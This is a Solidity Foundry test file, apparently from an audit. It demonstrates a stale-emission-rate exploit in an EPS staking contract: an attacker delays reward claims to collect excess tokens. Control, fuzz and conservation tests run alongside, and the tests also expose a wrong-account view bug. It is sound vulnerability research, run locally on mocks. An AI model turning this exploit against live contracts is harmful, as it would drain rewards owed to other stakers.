// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma abicoder v2;

import "./TestBase.sol";
import "./Mocks.sol";
import "../contracts/MultiFeeDistribution.sol";
import "../contracts/LpTokenStaker.sol";

contract StakingPoC is TestBase {
    uint256 internal constant START = 1_000_000;
    uint256 internal constant RATE_A = 100 ether;
    uint256 internal constant RATE_B = 50 ether;

    MockMintableToken internal eps;
    MockMintableToken internal fixedLp;
    MockMintableToken internal lpToken;
    MultiFeeDistribution internal mfd;
    LpTokenStaker internal staker;
    address internal attacker = address(0xA77ACC);
    address internal victim = address(0xDEADBEEF);

    function setUp() public {
        vm.warp(START);
        eps = new MockMintableToken("Ellipsis", "EPS", 18);
        fixedLp = new MockMintableToken("Fixed LP", "FLP", 18);
        lpToken = new MockMintableToken("Pool LP", "PLP", 18);

        uint128[] memory offsets = new uint128[](3);
        offsets[0] = 1000;
        offsets[1] = 2000;
        offsets[2] = 3000;
        uint128[] memory rates = new uint128[](3);
        rates[0] = uint128(RATE_A);
        rates[1] = uint128(RATE_B);
        rates[2] = 0;
        staker = new LpTokenStaker(offsets, rates, IERC20(address(fixedLp)));

        address[] memory minters = new address[](1);
        minters[0] = address(staker);
        mfd = new MultiFeeDistribution(address(eps), minters);
        staker.setMinter(Minter(address(mfd)));
        staker.addPool(IERC20(address(lpToken)), 0);
        staker.start();

        eps.mint(attacker, 1_000 ether);
        eps.mint(victim, 1_000 ether);
        eps.mint(address(this), 10_000 ether);
        eps.setMinter(address(mfd));
        mfd.approveRewardDistributor(address(eps), address(this), true);
        eps.approve(address(mfd), type(uint256).max);

        lpToken.mint(attacker, 1_000_000 ether);
        lpToken.mint(victim, 1_000_000 ether);
        vm.prank(attacker);
        lpToken.approve(address(staker), type(uint256).max);
        vm.prank(victim);
        lpToken.approve(address(staker), type(uint256).max);
        vm.prank(attacker);
        eps.approve(address(mfd), type(uint256).max);
        vm.prank(victim);
        eps.approve(address(mfd), type(uint256).max);
    }

    function _depositAttacker(uint256 amount) internal {
        vm.prank(attacker);
        staker.deposit(1, amount);
    }

    function _claimAttacker() internal {
        uint256[] memory pids = new uint256[](1);
        pids[0] = 1;
        vm.prank(attacker);
        staker.claim(pids);
    }

    function test_LOCAL_LEAD_stale_emission_withdrawal_and_signed_pnl() public {
        uint256 attackerLpBefore = lpToken.balanceOf(attacker);
        uint256 attackerEpsBefore = eps.balanceOf(attacker);
        uint256 protocolEpsBefore = eps.balanceOf(address(mfd));
        uint256 victimEpsBefore = eps.balanceOf(victim);
        uint256 victimLpBefore = lpToken.balanceOf(victim);

        _depositAttacker(1 ether);
        vm.warp(START + 1001);
        _claimAttacker(); // Activates 100 EPS/s after accounting the initial zero-rate interval.
        assertEq(staker.rewardsPerSecond(), RATE_A, "rate A activation");

        vm.warp(START + 3501);
        _claimAttacker(); // LOCAL MODEL: 2,500 seconds are all accounted at stale rate A.
        uint256 grossEarned = mfd.totalBalance(attacker);
        uint256 expectedGross = 120_000 ether; // 80% * (1,000*100 + 1,000*50)
        assertEq(grossEarned, 200_000 ether, "delayed-call gross model reward");
        assertGt(grossEarned, expectedGross, "stale-rate excess must exist");

        vm.prank(attacker);
        staker.withdraw(1, 1 ether);
        vm.prank(attacker);
        mfd.exit(); // Actual local EPS withdrawal; 50% earned-balance penalty applies.

        int256 attackerLpDelta = int256(lpToken.balanceOf(attacker)) - int256(attackerLpBefore);
        int256 attackerEpsDelta = int256(eps.balanceOf(attacker)) - int256(attackerEpsBefore);
        int256 protocolEpsDelta = int256(eps.balanceOf(address(mfd))) - int256(protocolEpsBefore);
        int256 victimEpsDelta = int256(eps.balanceOf(victim)) - int256(victimEpsBefore);
        int256 victimLpDelta = int256(lpToken.balanceOf(victim)) - int256(victimLpBefore);
        uint256 expectedExitProceeds = expectedGross / 2;
        uint256 excessExitProceeds = attackerEpsDelta >= 0
            ? uint256(attackerEpsDelta) - expectedExitProceeds
            : 0;

        console.log("MODEL_ONLY pin_block=UNAVAILABLE_NO_BSC_ARCHIVE");
        console.log("MODEL_ONLY state=STATE0 exact deployed Solidity; mock LP/EPS units=1e18");
        console.log("attacker LP delta (raw 1e18 units)", attackerLpDelta);
        console.log("attacker EPS gross withdrawal delta (raw 1e18 units)", attackerEpsDelta);
        console.log("attacker gas/flash-loan cost (model EPS units)", int256(0));
        console.log("attacker net P&L (model EPS units, USD unmeasured)", attackerEpsDelta);
        console.log("protocol retained EPS delta (raw 1e18 units)", protocolEpsDelta);
        console.log("victim EPS delta (raw 1e18 units)", victimEpsDelta);
        console.log("victim LP delta (raw 1e18 units)", victimLpDelta);
        console.log("schedule-correct gross EPS (raw 1e18 units)", int256(expectedGross));
        console.log("excess EPS withdrawal vs control (raw 1e18 units)", int256(excessExitProceeds));

        assertEq(attackerLpDelta, 0, "LP principal returned");
        assertEq(int256(100_000 ether), attackerEpsDelta, "actual local EPS withdrawal");
        assertEq(excessExitProceeds, 40_000 ether, "excess local withdrawal");
        assertTrue(attackerEpsDelta > 0, "local model profit must be positive");
    }

    function test_CONTROL_on_time_emission_boundaries() public {
        uint256 epsBefore = eps.balanceOf(attacker);
        _depositAttacker(1 ether);
        vm.warp(START + 1001);
        _claimAttacker();
        vm.warp(START + 2001);
        _claimAttacker();
        vm.warp(START + 3001);
        _claimAttacker();
        vm.warp(START + 3501);
        _claimAttacker();
        assertEq(mfd.totalBalance(attacker), 120_000 ether, "boundary control gross");
        vm.prank(attacker);
        staker.withdraw(1, 1 ether);
        vm.prank(attacker);
        mfd.exit();
        assertEq(eps.balanceOf(attacker) - epsBefore, 60_000 ether, "boundary control withdrawal");
        console.log("CONTROL on-time net model EPS withdrawal", uint256(60_000 ether));
    }

    function test_duplicate_claim_does_not_double_mint() public {
        _depositAttacker(1 ether);
        vm.warp(START + 1001);
        _claimAttacker();
        vm.warp(START + 1100);
        uint256 expected = staker.claimableReward(1, attacker);
        uint256[] memory pids = new uint256[](3);
        pids[0] = 1;
        pids[1] = 1;
        pids[2] = 1;
        vm.prank(attacker);
        staker.claim(pids);
        assertEq(mfd.totalBalance(attacker), expected, "duplicate pid reward conservation");
    }

    function test_unauthorized_mint_reverts() public {
        vm.expectRevert();
        vm.prank(attacker);
        mfd.mint(attacker, 1 ether);
    }

    function test_expired_lock_principal_conserved() public {
        uint256 before = eps.balanceOf(attacker);
        vm.prank(attacker);
        mfd.stake(100 ether, true);
        uint256 unlock = (START / 604800) * 604800 + 7_862_400;
        vm.warp(unlock + 1);
        vm.prank(attacker);
        mfd.withdrawExpiredLocks();
        assertEq(eps.balanceOf(attacker), before, "expired locked EPS returned");
        assertEq(mfd.totalSupply(), 0, "supply cleared");
        assertEq(mfd.lockedSupply(), 0, "locked supply cleared");
    }

    function test_view_wrong_msg_sender_is_not_withdrawal() public {
        _depositAttacker(1 ether);
        vm.warp(START + 1001);
        _claimAttacker();
        vm.warp(START + 1100);
        _claimAttacker();
        uint256 unlock = (START / 604800) * 604800 + 7_862_400;
        vm.warp(unlock + 1);
        vm.prank(attacker);
        uint256 victimReported = mfd.unlockedBalance(victim);
        assertGt(victimReported, 0, "caller earnings incorrectly returned for victim argument");
        vm.prank(victim);
        uint256 attackerReported = mfd.unlockedBalance(attacker);
        assertEq(attackerReported, 0, "victim caller sees zero for attacker argument");
        console.log("VIEW_ONLY wrong-account unlockedBalance; no token movement", victimReported);
    }

    function testFuzz_deposit_withdraw_principal(uint256 amount) public {
        amount = amount % 1_000_000 ether;
        if (amount == 0) amount = 1;
        uint256 before = lpToken.balanceOf(attacker);
        _depositAttacker(amount);
        vm.prank(attacker);
        staker.withdraw(1, amount);
        assertEq(lpToken.balanceOf(attacker), before, "same-block LP round trip");
        (uint256 userAmount, ) = staker.userInfo(1, attacker);
        assertEq(userAmount, 0, "user amount cleared");
    }

    function testFuzz_STATE0_stale_emission_counterexample(uint256 seed) public {
        // Eight external fuzz seeds replay this STATE0 family. Canonical values
        // and the full withdrawal sweep are asserted in the named PoC above.
        uint256 amount = (seed % 1_000_000 + 1) * 1 ether;
        uint256 delay = 2500 + (uint256(keccak256(abi.encode(seed))) % 7501);
        _depositAttacker(amount);
        vm.warp(START + 1001);
        _claimAttacker();
        vm.warp(START + 1001 + delay);
        _claimAttacker();

        uint256 actual = mfd.totalBalance(attacker);
        uint256 ideal = delay * RATE_A * 4 / 5;
        uint256 tolerance = amount / 1e12 + 1;
        assertTrue(actual + tolerance >= ideal, "actual below stale-rate ideal beyond rounding tolerance");
        assertTrue(actual + tolerance > 120_000 ether, "schedule-correct control exceeded beyond rounding tolerance");
        vm.prank(attacker);
        staker.withdraw(1, amount);
        assertEq(lpToken.balanceOf(attacker), 1_000_000 ether, "fuzz LP sweep");
    }
}
